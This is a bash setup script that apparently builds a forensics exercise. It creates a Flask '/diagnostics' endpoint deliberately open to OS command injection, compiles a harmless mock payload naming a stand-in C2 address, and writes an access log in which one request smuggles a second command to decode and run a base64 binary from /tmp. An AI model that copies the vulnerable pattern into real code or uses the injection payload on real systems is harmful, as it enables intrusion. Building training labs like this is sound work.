#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip gcc binutils coreutils
pip3 install pytest flask

useradd -m -s /bin/bash user || true

# 1. Create the vulnerable webapp
cat << 'EOF' > /home/user/webapp.py
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/diagnostics')
def diagnostics():
    target = request.args.get('target', '127.0.0.1')
    # Vulnerable to OS Command Injection (CWE-78)
    result = os.popen(f"ping -c 1 {target}").read()
    return result

if __name__ == '__main__':
    app.run()
EOF

# 2. Create and compile the malicious payload
cat << 'EOF' > /tmp/payload.c
#include <stdio.h>
int main() {
    char *c2_server = "198.51.100.77";
    printf("Connecting to %s\n", c2_server);
    return 0;
}
EOF

# Compile to a 64-bit ELF executable
gcc -m64 -o /tmp/payload_bin /tmp/payload.c

# Encode the payload in base64
PAYLOAD_B64=$(base64 -w0 /tmp/payload_bin)

# 3. Generate the access log
cat << EOF > /home/user/access.log
192.168.1.10 - - [14/Nov/2023:10:00:01 +0000] "GET / HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
192.168.1.15 - - [14/Nov/2023:10:05:12 +0000] "GET /diagnostics?target=8.8.8.8 HTTP/1.1" 200 450 "-" "curl/7.68.0"
10.10.50.8 - - [14/Nov/2023:10:12:45 +0000] "GET /diagnostics?target=127.0.0.1%3B+echo+${PAYLOAD_B64}+%7C+base64+-d+%3E+%2Ftmp%2Fmalware%3B+%2Ftmp%2Fmalware HTTP/1.1" 200 450 "-" "python-requests/2.25.1"
192.168.1.20 - - [14/Nov/2023:10:15:30 +0000] "GET /diagnostics?target=1.1.1.1 HTTP/1.1" 200 450 "-" "Mozilla/5.0"
EOF

# 4. Set permissions
chown user:user /home/user/webapp.py /home/user/access.log
chmod -R 777 /home/user
